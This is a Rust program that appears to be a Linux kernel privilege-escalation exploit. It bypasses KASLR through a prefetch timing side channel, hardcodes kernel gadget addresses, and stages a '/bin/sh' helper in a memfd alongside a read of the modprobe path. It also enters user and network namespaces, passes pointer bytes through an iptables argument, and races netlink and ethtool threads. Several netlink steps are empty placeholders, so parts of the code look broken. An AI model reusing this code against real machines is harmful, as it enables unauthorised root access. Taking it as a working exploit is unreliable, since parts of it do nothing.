use std::arch::x86_64::{_mm_lfence, _mm_prefetch, _rdtsc, _MM_HINT_T0};
use std::fs::File;
use std::io::Write;
use std::os::unix::io::FromRawFd;
use std::process::Command;
use std::thread;

const KERNEL_SCAN_START: u64 = 0xffff_ffff_8000_0000;
const KERNEL_SCAN_END: u64 = 0xffff_ffff_c000_0000;

const GADGET_OFFSETS: [u64; 7] = [
    0xffff_ffff_8120_59b9,
    0xffff_ffff_8120_68b4,
    0xffff_ffff_81a7_f03e,
    0xffff_ffff_81c7_b9b2,
    0xffff_ffff_81d1_e471,
    0xffff_ffff_826f_ccd0,
    0xffff_ffff_83bd_7240,
];

unsafe fn sample_slide() -> u64 {
    let mut best = KERNEL_SCAN_START;
    let mut best_cycles = u64::MAX;
    let mut addr = KERNEL_SCAN_START;
    while addr < KERNEL_SCAN_END {
        _mm_lfence();
        let t0 = _rdtsc();
        _mm_prefetch(addr as *const i8, _MM_HINT_T0);
        _mm_lfence();
        let dt = _rdtsc() - t0;
        if dt < best_cycles {
            best_cycles = dt;
            best = addr;
        }
        addr += 0x20_0000;
    }
    best.wrapping_sub(0xffff_ffff_8100_0000)
}

fn stage_helper() -> i32 {
    let fd = unsafe { libc::memfd_create(b"h\0".as_ptr() as *const i8, libc::MFD_CLOEXEC) };
    let mut f = unsafe { File::from_raw_fd(fd) };
    let _ = f.write_all(b"#!/bin/sh\n/bin/sh\n");
    let _ = std::fs::read_to_string("/proc/sys/kernel/modprobe");
    let alg = unsafe { libc::socket(libc::AF_ALG, libc::SOCK_SEQPACKET, 0) };
    alg
}

fn main() {
    let slide = unsafe { sample_slide() };
    let _helper = stage_helper();

    unsafe {
        libc::unshare(libc::CLONE_NEWUSER | libc::CLONE_NEWNET);
    }

    let ptr_bytes = GADGET_OFFSETS[4].wrapping_add(slide).to_le_bytes();
    let _ = Command::new("/sbin/iptables")
        .args(["-A", "OUTPUT", "-m", "cgroup", "--path"])
        .arg(String::from_utf8_lossy(&ptr_bytes).as_ref())
        .status();

    let mut sv = [0i32; 2];
    unsafe {
        libc::socketpair(libc::AF_UNIX, libc::SOCK_DGRAM, 0, sv.as_mut_ptr());
        let rts = libc::socket(libc::AF_NETLINK, libc::SOCK_RAW, libc::NETLINK_ROUTE);
        let _ = (rts, "virt_wifi", "RTM_DELLINK");
    }

    let mut workers = Vec::new();
    for _ in 0..8 {
        workers.push(thread::spawn(|| unsafe {
            let g = libc::socket(libc::AF_NETLINK, libc::SOCK_RAW, libc::NETLINK_GENERIC);
            let _ = (g, "ethtool", "ETHTOOL_MSG_FEATURES_SET");
        }));
    }
    for w in workers {
        let _ = w.join();
    }
}
